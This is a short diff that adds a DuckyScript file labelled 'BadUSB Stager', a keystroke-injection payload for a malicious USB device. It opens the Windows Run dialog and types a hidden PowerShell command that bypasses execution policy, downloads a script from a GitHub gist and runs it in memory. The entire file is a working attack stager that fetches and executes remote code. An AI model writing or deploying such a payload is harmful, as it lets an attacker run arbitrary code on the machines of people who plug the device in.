@@ -1,0 +1,6 @@
+REM BadUSB Stager
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/Sebisname/0ec07082c5a2bc753841c4af021afad4/raw/b631f3a71faa52023fed9c5bc67484551eae94dc/Secret%2520Gist')"
+ENTER
